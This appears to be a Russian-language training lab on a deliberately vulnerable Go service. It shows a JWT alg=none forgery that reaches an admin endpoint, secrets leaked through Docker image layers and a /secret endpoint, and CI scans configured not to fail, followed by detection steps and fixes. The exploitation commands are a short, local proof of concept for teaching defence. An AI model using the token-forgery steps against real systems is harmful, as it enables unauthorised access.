## Сценарий A: Провал CI/CD-конвейера на Go
**Уровень сложности:** продвинутый  
**Суть проблемы:**  
В этой задаче вам предстоит разобраться, как сочетание сразу трёх ошибок DevOps-практик приводит к критической уязвимости:

1. **Использование уязвимой библиотеки** JWT с поддержкой `alg=none` (CVE–RCE).  
2. **Утечка секретов** из-за попадания в образ файла `config.yaml` с чувствительными данными и передача секрета через Dockerfile, что отображается в слоях создания образа.  
3. **Игнорирование результатов сканирования** в CI/CD: `golangci-lint` и `Trivy` настроены так, что ошибки не останавливают конвейер.

В качестве приложения используется Go-сервис, который выдаёт JWT-токен, проверяет его в админ-эндпоинте и отдаёт пароль базы данных через `/secret`.

## Запуск
- Сборка
```sh
docker-compose up --build -d
```
- Убедитесь, что контейнеры запущены:
```sh
docker ps
```

## Эксплуатация уязвимостей
- JWT-уязвимость (alg=none):
```sh
# Получить токен
TOKEN=$(curl -s http://localhost:8080/login)
echo "$TOKEN"

# Попасть в админку без подписи
curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/admin
```

- Forge-токен с любым user
```sh
HEADER=$(printf '{"alg":"none","typ":"JWT"}' \
          | openssl base64 -e | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(printf '{"user":"admin","exp":%d}' \
          $(date -d "+1 hour" +%s) \
          | openssl base64 -e | tr -d '=' | tr '/+' '_-')
EXPLOIT="$HEADER.$PAYLOAD."
curl -H "Authorization: Bearer $EXPLOIT" http://localhost:8080/admin
```
- Утечка секретов:
```sh
curl http://localhost:8080/secret

docker history app-go:latest
```

- Утечка конфигурационных и секретных файлов:
```sh
docker exec -it laba_ci_disaster-app-go-1 sh

# В контейнере обнаружим все файлы, которые содержались в изначальной дериктории сборки контейнера
ls -al
```

## Обнаружение
- Trivy (scanner):
```sh
docker-compose logs scanner
```
увидите сообщения о CVE в библиотеке jwt-go.

- Code scanner:
```sh
docker-compose logs code-scan
```
найдёт потенциально опасные вызовы

- Просмотр слоев сборки образа:

```sh
docker history app-go:latest
```

## Исправления
- Обновить JWT-библиотеку:
Измените начало файла `main.go`
```go
package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"time"

	"github.com/golang-jwt/jwt/v4"
	"gopkg.in/yaml.v2"
)
```

- Исправить фунцию обработки входа(Новый `adminHandler`):
```go
func adminHandler(w http.ResponseWriter, r *http.Request) {
    auth := r.Header.Get("Authorization")
    if auth == "" {
        http.Error(w, "No token", http.StatusUnauthorized)
        return
    }
    tokenString := auth[len("Bearer "):]
    token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
        // Проверяем, что метод подписи — HMAC
        if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
            return nil, fmt.Errorf("Unexpected signing method: %v", token.Header["alg"])
        }
        return []byte(cfg.JWTSecret), nil
    })
    if err != nil || !token.Valid {
        http.Error(w, "Invalid token", http.StatusForbidden)
        return
    }
    claims := token.Claims.(jwt.MapClaims)
    fmt.Fprintf(w, "Welcome back, %v\n", claims["user"])
}
```

- Изменить файл `go.mod` для использования более новой версии Golang
```go
module labA_go_ci_disaster

go 1.24

require (
	github.com/golang-jwt/jwt/v4 v4.5.2
	gopkg.in/yaml.v2 v2.4.0
)

```

- Добавляем `.dockerignore`
```dockerignore
# игнорируем всё, кроме исходников Go и конфига
*
!main.go
!go.mod
!go.sum
!config.yaml
```

- Переписываем Dockerfile на multi-stage build
```Dockerfile
# Stage 1: build
FROM golang:1.24-alpine AS builder
WORKDIR /app
RUN apk add --no-cache git ca-certificates bash

COPY . .
RUN go mod tidy
RUN go mod download

RUN go build -o server main.go

# Stage 2: runtime
FROM alpine:3.17
WORKDIR /app

# Копируем только бинарь и конфиг
COPY --from=builder /app/server .
COPY --from=builder /app/config.yaml .

# Минимизируем поверхность атаки
RUN addgroup -S app && adduser -S app -G app
USER app

EXPOSE 8080
CMD ["./server"]
```
